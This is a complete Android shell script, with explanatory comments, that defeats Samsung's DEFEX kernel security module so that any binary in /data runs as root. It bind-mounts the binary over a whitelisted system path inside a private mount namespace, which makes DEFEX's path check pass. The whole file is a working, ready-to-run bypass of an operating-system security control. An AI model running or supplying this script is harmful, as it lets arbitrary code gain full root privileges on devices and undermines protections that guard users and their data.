#!/system/bin/sh
# runroot.sh - run any /data ELF as root, defeating Samsung DEFEX.
#
# DEFEX (security/samsung/defex_lsm) denies execve of non-safeplace paths **when
# the caller has root creds**, but it checks the *mount-namespace path* (d_path)
# of the target file (defex_common.c: get_dc_target_name() -> d_path()).  A bind
# mount of our binary over a path that IS in the compiled-in safeplace list makes
# it look safeplace, so DEFEX allows it and the process runs as uid 0 / full caps.
#
# Run it inside a private mount namespace (unshare -m) so the bind mount never
# leaks into the system's namespace.
#
# Usage:  runroot.sh <data-binary-abs-path> [args...]
set -e
BIN="$1"; shift
if [ -z "$BIN" ]; then echo "usage: runroot.sh <data-binary> [args...]" >&2; exit 2; fi
case "$BIN" in /*) ;; *) BIN="/data/local/tmp/$BIN" ;; esac
[ -x "$BIN" ] || { echo "runroot: not executable: $BIN" >&2; exit 2; }

# Pick a safeplace path that exists and is rarely used at runtime.
for s in /system/bin/fsdbg /system/bin/smdexe /system/bin/ddexe /system/bin/resetreason /system/bin/atrace; do
  [ -e "$s" ] && SAFE="$s" && break
done
[ -n "$SAFE" ] || { echo "runroot: no safeplace target found" >&2; exit 3; }

# private mount ns: bind our binary over $SAFE, then exec it ($SAFE path => d_path safeplace)
exec /system/bin/unshare -m /system/bin/sh -c '
  mount --make-rprivate / 2>/dev/null
  b="$1"; s="$2"; shift 2
  mount --bind "$b" "$s" || { echo "runroot: bind failed" >&2; exit 4; }
  exec "$s" "$@"
' sh "$BIN" "$SAFE" "$@"
